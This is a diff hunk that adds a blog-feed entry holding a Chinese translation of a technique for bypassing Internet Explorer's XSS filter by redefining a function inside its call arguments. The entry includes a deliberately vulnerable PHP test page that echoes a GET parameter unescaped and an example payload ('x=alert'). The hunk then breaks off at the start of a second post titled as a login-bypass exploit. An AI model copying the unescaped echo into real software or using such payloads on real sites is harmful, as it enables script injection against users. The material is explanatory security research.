@@ -3,6 +3,31 @@
   
     
     <entry>
+      <title><![CDATA[通过函数重定义绕过xss过滤器(IE)]]></title>
+      <url>/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
+      <content type="html"><![CDATA[<p>这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div></pre></td></tr></table></figure>
+<p>现在我们需要建立一个实验页面，让用户可控参数出现到JS函数的参数里面。</p>
+<p>test.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function x() &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&lt;?php</div><div class="line">$x = isset($_GET[&apos;x&apos;]) ? $_GET[&apos;x&apos;] : &apos;&apos;;</div><div class="line">?&gt;</div><div class="line">x(&apos;&lt;?php echo $x?&gt;&apos;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>在老版本的IE浏览器里面，是有可能在一个函数的调用参数的地方重定义这个函数的。这将对绕过xss过滤器非常有用（如果你的payload能出现在这里）</p>
+<p>通过GET传参<code>somepage.php?x=1&#39;,x=alert,&#39;</code></p>
+<p>最后的结果像是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function x() &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">x(&apos;1&apos;,x=alert,&apos;&apos;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这个payload将闭合两边的引号，同时<code>function x</code>重定义为<code>alert</code>因为alert只接受一个参数，所以其他的多余参数将被忽 <img src="xss1.PNG" alt=""></p>
+<h2 id="不背翻译的锅"><a href="#不背翻译的锅" class="headerlink" title="不背翻译的锅"></a>不背翻译的锅</h2><p><a href="http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/" target="_blank" rel="external">http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/</a></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[hadsky部分用户任意登录]]></title>
       <url>/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
       <content type="html"><![CDATA[<h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>在注册页面</p>
